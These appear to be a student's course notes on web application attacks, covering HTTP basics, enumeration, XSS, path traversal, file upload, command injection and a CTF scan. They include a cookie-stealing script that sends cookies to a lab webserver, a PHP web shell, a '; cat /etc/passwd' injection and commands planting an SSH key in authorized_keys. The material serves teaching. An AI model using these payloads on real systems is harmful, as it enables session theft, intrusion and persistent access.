## HTTP Methods
* GET
* POST
* HEAD
* PUT
## HTTP Response Codes
* 10X - Informational
* 2XX - Success
* 30X = Redirection
* 4XX - Client Error
* 5XX - Server Error
## HTTP Fields
* User-Agent
* Referer
* Cookie
* Date
* Server
* Set-Cookie
## JavaScript Interaction
```
<script>
function myFunction() {
    document.getElementById("demo").innerHTML = "Paragraph changed.";
}
</script>
<script src="https://www.w3schools.com/js/myScript1.js"></script>
```
* JS Demo - http://10.50.XX.XX/java/Javademo.html
## Enumeration
* ROBOTS.TXT
  - If you find this file, go to it and enumerate (There might be something important here)
* Legitimate surfing
* Tools:
  - NSE scripts
  - Nikto
  - Burp suite (outside class)
## Cross-Site scripting (XSS) Overview
* Insertion of arbitrary code into a webpage, that executes in the browser of visitors
* Unsanitized GET, POST, and POST methods allow JS to be placed on websites
* Often found in forums that allow HTML
## Reflected XXS
* Most common form of XSS
* Transient, occurs in error messages or search results
* Delivered through intermediate media, such as a link in an emial
* Characters that are normally illegal in URLs can be Base64 encoded
## Stored XSS
* Resides on vulnerable site
* Only requires user to visit page
```
<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
```
## Useful Javascript components
* Proof of concept (simple alert)
  - `<script>alert('XSS');</script>`
* Capturing Cookies
  - `document.cookie`
* Capturing Keystrokes
  - `bind keydown and keyup`
* Capturing Sensitive Data
  - `document.body.innerHTML`
## Server-Side Injection
* Ability to read/execute outside web server's directory
* Uses `../../` (relative Paths) in manipulating a server-side file path
* `www-data` is the user that web servers on ubuntu or Apache, Nginx
## Malicious File Upload
* Server Doesnt Validate extension or size
* Allows or code execution (shell)
* Once uploaded
  - Find your file
  - Call your file
#### Establishes a shell
```
<HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
```
## Command Injection
* User input not validated
* Might contain the following in it’s code:
```
system("ping -c 1 ".$_GET["ip"]);
```
* Run the following to chain/stack our arbitrary command
```
; cat /etc/passwd
```
## Key Regen (SSH)
```
ssh-keygen -t rsa -b 4096
cat  /.ssh/id_rsa.pub
echo "your key" > /var/www/.ssh/authorized_keys
```
# Demo
```
python3 -m http.server # This makes a webserver
<script>document.location="http://10.50.30.231:8000/"+document.cookie;</script> # This script steals cookies from users and sends it to our webserver
```
# CTF
```
64 bytes from 10.100.28.33: icmp_seq=1 ttl=64 time=0.191 ms
64 bytes from 10.100.28.34: icmp_seq=1 ttl=63 time=1.31 ms
64 bytes from 10.100.28.35: icmp_seq=1 ttl=63 time=2.58 ms
64 bytes from 10.100.28.40: icmp_seq=1 ttl=63 time=0.593 ms
64 bytes from 10.100.28.48: icmp_seq=1 ttl=63 time=0.608 ms

Nmap scan report for 10.100.28.48
Host is up (0.00049s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
4444/tcp open  krb524

```

















